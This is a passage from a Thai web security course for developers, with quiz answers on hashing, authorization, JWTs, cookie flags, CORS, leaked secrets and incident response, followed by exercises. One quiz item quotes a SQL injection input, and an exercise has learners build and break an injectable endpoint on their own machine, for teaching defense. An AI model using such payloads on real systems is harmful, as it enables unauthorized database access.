<summary>1. ทำไม hash รหัสผ่านด้วย bcrypt ดีกว่า encrypt?</summary>

hash ย้อนกลับไม่ได้ ถึง DB หลุดก็ไม่ได้รหัสจริง ส่วน encrypt ถ้ากุญแจหลุดก็ถอดได้ทุกรหัส และ bcrypt ออกแบบให้ช้าและมี salt ทำให้เดายาก

</details>

<details>
<summary>2. หน้าเว็บซ่อนปุ่ม "ลบ" จากพนักงานทั่วไปแล้ว ปลอดภัยหรือยัง?</summary>

ยัง ใครก็ส่ง request `DELETE` ตรงๆ ได้ ต้องเช็คสิทธิ์ (authorization) ที่ server ด้วย

</details>

<details>
<summary>3. ใส่เลขบัตรประชาชนลูกค้าไว้ใน JWT ได้ไหม?</summary>

ไม่ได้ JWT ถอดอ่านได้โดยใครก็ได้ แค่แก้ไขไม่ได้ ห้ามใส่ข้อมูลลับหรือข้อมูลส่วนตัว

</details>

<details>
<summary>4. ผู้ใช้พิมพ์อีเมลเป็น `x' OR '1'='1` ทำไมโค้ดแบบต่อสตริงถึงเจาะได้ แต่แบบ parameter ไม่ได้?</summary>

แบบต่อสตริง ข้อความผู้ใช้กลายเป็นส่วนหนึ่งของคำสั่ง SQL ทำให้เงื่อนไขเป็นจริงเสมอ แบบ parameter ส่ง "โครงคำสั่ง" กับ "ค่า" แยกกัน DB ถือว่าค่าเป็นข้อมูลล้วนๆ ไม่มีทางถูกตีความเป็นคำสั่ง

</details>

<details>
<summary>5. cookie เซสชันควรตั้งแฟลกอะไร และแต่ละอันกันอะไร?</summary>

`HttpOnly` กัน JavaScript อ่าน (ลดความเสียหายจาก XSS), `Secure` ส่งเฉพาะ HTTPS (กันดักอ่าน), `SameSite` ไม่แนบเมื่อมาจากเว็บอื่น (กัน CSRF) และตั้งอายุ (`Max-Age`) ให้ cookie หมดอายุเอง

</details>

<details>
<summary>6. ตั้ง CORS ให้อนุญาตเฉพาะเว็บเรา แล้ว API ปลอดภัยจากคนที่ใช้ curl ยิงตรงไหม?</summary>

ไม่ CORS เป็นกฎของ browser ไม่ได้กัน curl หรือโปรแกรมอื่น ข้อมูลที่ต้องปกป้องต้องใช้ login และการเช็คสิทธิ์ที่ server

</details>

<details>
<summary>7. เผลอ commit `.env` ขึ้น Git แล้ว ลบไฟล์ใน commit ถัดไป เพียงพอไหม?</summary>

ไม่พอ ไฟล์เก่ายังอยู่ในประวัติ Git ต้อง **เปลี่ยนรหัส/key นั้นทันที (rotate)** แล้วแจ้งพี่

</details>

<details>
<summary>8. เจอช่องโหว่ระดับ high จาก `npm audit` ควรทำอะไร?</summary>

ดูว่ามี fix ไหม อัปเดตด้วย `npm audit fix` (หรือแก้เวอร์ชันเอง) แล้วทดสอบว่าแอปยังทำงาน ถ้าแก้ไม่ได้ให้แจ้งพี่เพื่อประเมินผลกระทบ อย่า `--force` โดยไม่เข้าใจ

</details>

<details>
<summary>9. สงสัยว่ารหัสผ่าน DB หลุดไปอยู่ในแชทกลุ่ม ลำดับการทำคืออะไร?</summary>

เปลี่ยนรหัสผ่านทันที (หยุดความเสียหาย) → แจ้งพี่ → ตรวจ log ว่ามีการใช้ผิดปกติไหม → ลบข้อความ (เพิ่มเติม) → ทบทวนว่าจะกันไม่ให้เกิดอีกยังไง การลบข้อความอย่างเดียวไม่พอ เพราะอาจมีคนเห็นหรือเก็บไปแล้ว

</details>

## ✏️ แบบฝึกหัด

ใน API บทที่ 5 เพิ่ม:
1. `POST /register` รับ email + password (Zod: email ถูกรูปแบบ, password ≥ 8 ตัว) เก็บแบบ hash
2. `POST /login` ตอบ `200` ถ้าถูก, `401` พร้อมข้อความกลางๆ ถ้าผิด
3. ตรวจ env ด้วย Zod ตอนเริ่มแอป

**ท้าทายเพิ่ม (ถ้าอยากฝึกต่อ)**
4. เพิ่ม rate limit ที่ `/login` (ผิดเกิน 5 ครั้งใน 15 นาที ตอบ `429`)
5. ตอน login สำเร็จ ตั้ง cookie แบบ `HttpOnly`, `SameSite=Lax`, มีอายุ แล้วตรวจด้วย `curl -i` ว่าเห็นแฟลกครบ
6. รัน `npm audit` กับโปรเจกต์ตัวเอง จดผลว่าเจออะไรและแก้ยังไง
7. **"ลองพัง" แล้วป้องกัน:** ทำ endpoint ค้นหาที่ต่อสตริง SQL (ใน SQLite ทดลองแบบข้อ 4) เจาะให้ได้ แล้วแก้เป็น parameter จนเจาะไม่ได้ (ทำเฉพาะในเครื่องและโค้ดของตัวเองเท่านั้น)

## ✅ ผ่านด่าน

- [ ] อธิบาย threat thinking 3 ข้อ และ defense in depth ได้
- [ ] เก็บความลับใน `.env` และรู้ว่าทำยังไงถ้าหลุด (rotate)
- [ ] hash รหัสผ่านด้วย bcrypt/argon2 ได้ และบอกได้ว่าทำไม hash ไม่ใช่ encrypt

- [ ] ตั้ง cookie ให้ปลอดภัย (`HttpOnly`, `Secure`, `SameSite`) ได้
- [ ] รู้จัก SQL injection, XSS, CSRF และวิธีป้องกันแต่ละอัน
- [ ] อธิบาย CORS vs security, HTTPS และ least privilege ได้
- [ ] รัน `npm audit` และอ่านผลได้
- [ ] รู้ว่าข้อมูลลูกค้าต้องดูแลยังไงตาม PDPA และรู้ขั้นตอนเมื่อเกิดเหตุ
